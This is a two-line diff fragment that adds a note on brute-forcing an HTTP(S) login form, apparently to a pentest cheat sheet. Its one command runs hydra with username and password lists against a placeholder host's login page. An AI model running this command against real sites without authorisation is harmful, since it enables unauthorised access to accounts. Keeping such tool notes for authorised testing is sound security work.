@@ -1,0 +1,2 @@
+# Bruteforce http(s) form :
+hydra -L usernames.txt -P passwords.txt <ip_host> http-post-form “/exemple/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”
